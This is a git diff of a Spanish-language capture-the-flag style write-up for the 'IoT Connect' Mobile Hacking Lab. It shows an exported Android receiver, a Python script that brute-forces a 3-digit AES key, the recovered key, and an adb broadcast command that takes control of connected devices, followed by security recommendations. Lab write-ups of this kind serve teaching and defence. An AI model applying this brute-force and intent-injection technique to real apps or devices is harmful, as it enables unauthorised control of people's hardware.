@@ -50,7 +50,7 @@ Exploramos el archivo `AndroidManifest.xml` y encontramos:
         <action android:name="MASTER_ON"/>
     </intent-filter>
 </receiver>
-
+```
 ✅ Está exportado, lo que significa que cualquier app externa o ADB puede enviarle un intent.
 Componentes Relevantes
 
@@ -78,7 +78,7 @@ Si es válido, se llama a turnOnAllDevices(context).
 
 Análisis de Seguridad: Checker
 En la clase Checker se encuentra lo siguiente:
-
+```
 java
 Copiar
 Editar
@@ -87,6 +87,7 @@ private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";
 public final boolean check_key(int key) {
     return decrypt(ds, key).equals("master_on");
 }
+```
 El string cifrado se desencripta con AES/ECB/PKCS5Padding.
 
 La clave se genera con el valor entero del PIN proporcionado.
@@ -94,13 +95,11 @@ La clave se genera con el valor entero del PIN proporcionado.
 Si el resultado es "master_on" el acceso es válido.
 
 
-🧨 Fuerza Bruta del PIN
+## 🧨 Fuerza Bruta del PIN
 Como el PIN es de 3 dígitos, creamos un script Python para romper la clave por fuerza bruta.
 
-Código Python
-python
-Copiar
-Editar
+### Código Python
+```
 from Crypto.Cipher import AES
 from base64 import b64decode
 
@@ -126,21 +125,19 @@ for i in range(100, 1000):
             break
     except Exception:
         continue
-
+```
 
 Resultado:
 
-yaml
-Copiar
-Editar
+```
 ✔️ Key encontrada: 345, Resultado: master_on
 🚀 Explotación desde ADB
 Ahora podemos explotar la vulnerabilidad usando el siguiente comando ADB:
+```
 
-bash
-Copiar
-Editar
+```
 adb shell am broadcast -a MASTER_ON --ei key 345
+```
 Resultado:
 
 ✅ El sistema responde:
@@ -157,7 +154,7 @@ Fue posible forzar la clave por fuerza bruta (solo 3 dígitos).
 
 Se obtuvo control total de los dispositivos conectados simplemente enviando un Intent.
 
-🛡️ Recomendaciones de Seguridad
+## 🛡️ Recomendaciones de Seguridad
 Establecer android:exported="false" para componentes sensibles.
 
 Validar siempre permisos y autenticación en receivers.
@@ -168,7 +165,7 @@ No usar AES en modo ECB (es inseguro y predecible).
 
 Evitar lógica de seguridad crítica en el lado cliente.
 
-📁 Créditos
+## 📁 Créditos
 Análisis realizado por fr3do
 
 Laboratorio: IoT Connect - Mobile Hacking Lab
